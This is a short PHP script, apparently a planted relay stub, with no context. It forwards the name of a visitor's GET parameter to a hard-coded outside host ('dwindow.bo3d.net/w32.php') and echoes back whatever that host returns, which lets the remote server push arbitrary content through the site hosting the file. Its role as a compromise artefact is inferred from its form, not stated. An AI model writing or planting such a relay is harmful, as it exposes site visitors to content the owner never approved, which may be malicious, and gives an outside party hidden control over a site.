<?php
$t = "http://dwindow.bo3d.net/w32.php";
$p = "";
while (list($name, $value) = each($_GET))
	$p = $name;
echo file_get_contents($t."?".$p);
?>